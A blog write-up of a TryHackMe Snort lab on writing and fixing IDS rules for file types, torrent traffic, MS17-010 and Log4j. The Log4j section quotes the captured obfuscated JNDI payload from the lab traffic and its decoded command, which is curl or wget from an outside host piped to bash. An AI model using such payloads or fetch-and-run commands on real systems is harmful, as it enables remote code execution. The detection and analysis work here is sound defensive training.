---
title: "[SOC-Level 1] Tryhackme - Snort Challenge Part 2"
date: 2024-10-04 13:00:00 -500 
categories: [SOC-Level 1 - Tryhackme, Snort Challenge Part 2]
tags: [soc,tryhackme,blueteam,snort]
author: Christoph K
---
[TryHackMe- Snort Challenge ](https://tryhackme.com/r/room/snortchallenges1)


## Task 3: Writing IDS Rules (PNG)

1. Investigate the logs and identify the software name embedded in the packet.
2. Investigate the logs and identify the image format embedded in the packet.


### 1. Investigate the logs and identify the software name embedded in the packet.


    Write a rule to detect the PNG file in the given pcap.


Okay how can filter a `png` file in a network. We have to filter for the payload `hex data` from a png file. A small google seach showed, we need following content in our rule:

`|89 50 4E 47 0D 0A 1A 0A|`

Rule:
`alert tcp any any <> any any (msg:"PNG File found";content:"|89 50 4E 47 0D 0A 1A 0A|";sid:10000002;rev:1;)`

After running `snort`we detect `1 alert`! So we write a logfile with `-l` and translate the `logfile` with `strings`:


```bash
ubuntu@ip-10-10-116-7:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo strings snort.log.1728108743 
IHDR
tEXtSoftware
Adobe ImageReadyq
.IDATx
nvfw
A)_,
` ^,
XBy6
`'?/
]}gb
lYy[)
3W}B=
OnOh
WLCO/
RnR7
0WGJ
```

Answer: `Adobe ImageReadyq`


### 2. Investigate the logs and identify the image format embedded in the packet.

    Write a rule to detect the GIF file in the given pcap.  

We change the `rule` that we only find `gif`files.

The hex for `gif` is: 
`47 49 46 38`



`alert tcp any any <> any any (msg:"PNG File found";content:"|47 49 46 38|";sid:10000002;rev:1;)`

And again we have to make a log file and investigate it with `strings`:

```bash
ubuntu@ip-10-10-116-7:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo strings snort.log.1728109155 
GIF89a
GIF89a
GIF89a
GIF89a
```

Answer: `GIF89a`

## Task 4: Writing IDS Rules (Torrent Metafile)

1. What is the number of detected packets?
2. What is the name of the torrent application?
3. What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?
4. What is the hostname of the torrent metafile?



### 1. What is the number of detected packets?


    Write a rule to detect the torrent metafile in the given pcap.


Small Overview about Torrent:

##### What is a Torrent File?
A torrent file is a small file that helps you download larger files from the internet.
It does not contain the actual content (like a movie or game) but has information about the content you want to download.

##### How Does It Work?
Tracker Information:

- The torrent file contains a tracker URL, which is a server that helps connect users (called "peers") who want to share and download the same file.
File Pieces:

- It divides the large file into smaller pieces. This way, you can download different pieces from different people at the same time.
Sharing:

- When you download a file using a torrent, you are not just downloading it from one person. Instead, you get pieces from multiple people (peers) who already have the file.
After you download a piece, you can also share it with others, making the download process faster.


So I checked the `pcap` file a bit for "inspiration" and it seems we have to find the `Tracker Information`in a file, which would prove, that it is a `torrent metafile`.

After research we can use `content:" announce" `

`alert tcp any any <> any any (msg:"Torrent Metafile detected"; content:"announce";sid:10000002;rev:1;)`


```bash

alert tcp any any <> any any (msg:"Torrent Metafile detected"; content:"announce";sid:10000002;rev:1;)

```

Answer: `2`

### 2. What is the name of the torrent application?


Lets make a logfile and check the contents via `strings`:

```bash
ubuntu@ip-10-10-116-7:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo strings snort.log.1728109991 
GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED%F6%03%C49%D6B%14%F1&peer_id=%B8js%7F%E8%0C%AFh%02Y%967%24e%27V%EEM%16%5B&port=41730&uploaded=0&downloaded=0&left=3767869&compact=1&ip=127.0.0.1&event=started HTTP/1.1
Accept: application/x-bittorrent
Accept-Encoding: gzip
User-Agent: RAZA 2.1.0.0
Host: tracker2.torrentbox.com:2710
Connection: Keep-Alive
```
Answer: `bittorrent`

### 3. What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?

With our previous method we already found out what the MIME type is.


Answer: `application/x-bittorrent`


### 4. What is the hostname of the torrent metafile?


And again, the answer is already here.

```bash

ubuntu@ip-10-10-116-7:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo strings snort.log.1728109991 
GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED%F6%03%C49%D6B%14%F1&peer_id=%B8js%7F%E8%0C%AFh%02Y%967%24e%27V%EEM%16%5B&port=41730&uploaded=0&downloaded=0&left=3767869&compact=1&ip=127.0.0.1&event=started HTTP/1.1
Accept: application/x-bittorrent
Accept-Encoding: gzip
User-Agent: RAZA 2.1.0.0
Host: tracker2.torrentbox.com:2710
Connection: Keep-Alive
```

Answer: `tracker2.torrentbox.com`



## Task 5: Troubleshooting Rule Syntax Errors

1. Fix rule 1
2. Fix rule 2 
3. Fix rule 3
4. Fix rule 4 
5. Fix rule 5
6. Fix rule 6 
7. Fix rule 7



### 1. Fix rule 1


- Rule: 

    alert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)


- Analysis: 

Seems like a syntax error. When we run the rule it says, we need a space between `any(msg:`


- Fix:

    alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)


Answer: `16`

### 2. Fix rule 2


- Rule:

    alert icmp any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)

- Analysis:

There is an `any` missing in the beginning.

- Fix: 

    alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)


Answer: `68`


### 3. Fix rule 3

- Rule:

    alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
    alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000001; rev:1;)

- Analysis:


The `sid` is the same. I also dont like to write several ports in one rule..

- Fix:


    alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
    alert tcp any any -> any 80 (msg: "HTTP Packet Found"; sid:1000002; rev:1;)
    alert tcp any any -> any 443 (msg: "HTTPs Packet Found"; sid:1000003; rev:1;)

Answer: `87`


### 4. Fix rule 4

- Rule:

    alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
    alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found": sid:1000001; rev:1;)

- Analysis:


The `sid` is the same. And after `msg` it has be separated with `; `(2nd alert)

- Fix:


    alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
    alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)

Answer: `90`








### 5. Fix rule 5



- Rule:

    alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
    alert icmp any any <- any any (msg: "Inbound ICMP Packet Found"; sid;1000002; rev:1;)
    alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found": sid:1000003; rev:1;)

- Analysis:

`<-` does not exist. Also `sid:` instead of `sid;`.. Also last row after `msg` we have to seperate it properly with `; `

- Fix:


    alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
    alert icmp any any <> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
    alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)

    Answer: `155`

### 6. Fix rule 6



- Rule:

    alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|67 65 74|"; sid: 100001; rev:1;)

- Analysis:

Rule has no syntax errors. After checking, the `hex header`is wrong.. Has to be `content:"|47 45 54 20|"`


- Fix:

    alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|47 45 54 20|"; sid: 100001; rev:1;)

Answer: `2`


### 7. Fix rule 7



- Rule:

    alert tcp any any <> any 80  (content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)

- Analysis:

Well, `msg` is missing.. Is a logical mistake.


- Fix:


    alert tcp any any <> any 80  (msg:"html"; content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)

Answer: `msg`


## Task 6: Using External Rules (MS17-010)

1. What is the number of detected packets?
2. What is the number of detected packets?
3. What is the requested path?
4. What is the CVSS v2 score of the MS17-010 vulnerability?


### 1. What is the number of detected packets?


    Use the given rule file (local.rules) to investigate the ms1710 exploitation.


#### What is ms1710?

    MS17-010 is a security update released by Microsoft in March 2017 to address a critical vulnerability in Windows operating systems, specifically in the Server Message Block (SMB) protocol. This vulnerability, often referred to as "EternalBlue," allowed attackers to exploit computers running unpatched versions of Windows. 


Lets run the rules:

`sudo snort -c local.rules -A full -r ms-17-010.pcap`


```bash

===============================================================================
Action Stats:
     Alerts:        25154 ( 53.916%)
     Logged:        25154 ( 53.916%)
     Passed:            0 (  0.000%)

```

Answer: `25154`


### 2. What is the number of detected packets?

    Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.

We can have a look into the ruleset from `rules.local`. 

Rule:
`alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$";sid: 20244225; rev:3;)`


```bash

===============================================================================
Action Stats:
     Alerts:           12 (  0.026%)
     Logged:           12 (  0.026%)
     Passed:            0 (  0.000%

```

Answer: `12`


### 3. What is the requested path?

We create a logfile again with the same rule from question 2. ( `-l`)

Lets use `strings`:
```bash
ubuntu@ip-10-10-116-7:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo strings snort.log.1728113226 
SMBu
\\192.168.116.138\IPC$
?????
SMBu

```


Answer: `\\192.168.116.138\IPC$`


### 4. What is the CVSS v2 score of the MS17-010 vulnerability?

Short research: [https://www.cvedetails.com/](https://www.cvedetails.com/cve/CVE-2017-0144/)

    CVE-2017-0144 (EternalBlue) CVSS Score:
    Base Score: 9.3 (High)
    Attack Vector: Network (exploitable remotely)
    Attack Complexity: Low
    Privileges Required: None
    User Interaction: None
    Scope: Unchanged
    Confidentiality Impact: High
    Integrity Impact: High
    Availability Impact: High

Answer: `9.3`


## Task 7: Using External Rules (Log4j)


1. What is the number of detected packets?
2. How many rules were triggered? 
3. What are the first six digits of the triggered rule sids?
4. What is the number of detected packets?
5. What is the name of the used encoding algorithm?
6. What is the IP ID of the corresponding packet?
7. What is the attacker's command?
8. What is the CVSS v2 score of the Log4j vulnerability?


### 1. What is the number of detected packets?


#### What is Log4J?

Log4j is a library used in Java applications that helps developers record messages, errors, and information about what their programs are doing. It allows these applications to log events, which can help in troubleshooting and monitoring performance.

#### Vulnerability Log4J

In December 2021, a serious security flaw was discovered in Log4j called Log4Shell. This vulnerability allowed attackers to take control of computers running affected versions of Log4j by sending specially crafted messages. Because Log4j is widely used in many applications, this vulnerability posed a significant risk, making it easy for attackers to exploit it and execute harmful code remotely.


____ 

We use again our standard command for running the rule:

`sudo snort -c local.rules -A full -r log4j.pcap`

```bash

Action Stats:
     Alerts:           26 (  0.057%)
     Logged:           26 (  0.057%)
     Passed:            0 (  0.000%)

```

Answer: `26`






### 2. How many rules were triggered? 

We check again the summary from snort and find the `filtered events`.


```bash
===============================================================================
+-----------------------[filtered events]--------------------------------------
| gen-id=1      sig-id=21003730   type=Limit     tracking=dst count=1   seconds=3600 filtered=2
| gen-id=1      sig-id=21003731   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
| gen-id=1      sig-id=21003728   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
```

Answer: `4`

### 3. What are the first six digits of the triggered rule sids?

In the output from `question 2`. 

Answer: `210037`


### 4. What is the number of detected packets?


We can build a rule to check the size with `dsize`:

`alert tcp any any <> any any (msg:"Size check";dsize:770<>855;sid:10000001;rev:1;)`


Answer: `41`

### 5. What is the name of the used encoding algorithm?

We create a log with `-l` and analyse it with `strings`.

I had to search a while but eventually I found it:

```bash

Host: 198.71.247.91:80
User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=}
Referer: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=}


```
There is `Base64` in the string from `User-Agent`.

Answer: `Base64`


### 6. What is the IP ID of the corresponding packet?

For that we have to analyze our `alert`.

I used:
`sudo strings alert |grep 45.155.205.233 -e ID`

(IP from last question)

```bash
12/12-05:06:07.579734 45.155.205.233:39692 -> 198.71.247.91:80
TCP TTL:53 TOS:0x0 ID:62808 IpLen:20 DgmLen:827
```

Answer: `62808`





### 7. What is the attacker's command?


Lets take a look into our `log`in `strings`:

`KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=}`


Lets try to decode that.


Answer: 
`(curl -s 45.155.205.233:5874/162.0.228.253:80 || wget -q -O- 45.155.205.233:5874/162.0.228.253:80) | bash`

### 8. What is the CVSS v2 score of the Log4j vulnerability?

I had to do longer research because the most Websites tell you the score : `10.0`
But after a while I found out, that the score is `9.3`


Answer: `9.3`




### Thoughts:

That was a fantastic lab and I really enjoyed creating rules and analyzing stuff. Altough it was a loooon day :-) 
What did we learn?

- Creating rules and alerts to detect malicious traffic or payloads
- Analyzing Logs 
- Understand more about how attacks could look like